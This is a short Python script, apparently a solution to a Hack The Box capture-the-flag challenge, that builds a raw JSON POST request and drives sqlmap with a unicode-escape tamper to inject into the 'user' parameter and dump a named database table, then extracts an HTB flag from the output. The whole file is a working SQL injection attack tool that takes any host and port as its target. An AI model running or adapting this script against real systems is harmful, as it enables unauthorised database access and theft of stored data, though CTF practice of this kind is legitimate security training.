import sys
import subprocess
import re
import tempfile
import os

if len(sys.argv) != 2:
    print("Usage: python3 SqlmapExploit.py ip:port")
    sys.exit(1)

host = sys.argv[1]
host_ip, port = host.split(":")

request_data = f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/json
Content-Length: 16

{{"user":"INJ"}}
"""

with tempfile.NamedTemporaryFile(mode="w+", delete=False, suffix=".txt") as req_file:
    req_file.write(request_data)
    req_file_path = req_file.name

print(f"Created temporary request file at: {req_file_path}")

cmd = [
    "sqlmap",
    "-r", req_file_path,
    "--tamper=charunicodeescape",
    "-p", "user",
    "-t", "10",
    "-D", "db_m8452",
    "-T", "definitely_not_a_flag",
    "-C", "flag",
    "--dump",
    "--batch"
]

print("Sqlmap is starting")
try:
    output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
except subprocess.CalledProcessError as e:
    print("[!] sqlmap failed:")
    print(e.output)
    os.remove(req_file_path)
    sys.exit(1)

flag = re.search(r"HTB\{.*?\}", output)
if flag:
    print("Flag found:", flag.group(0))
else:
    print("Flag not found.")

os.remove(req_file_path)
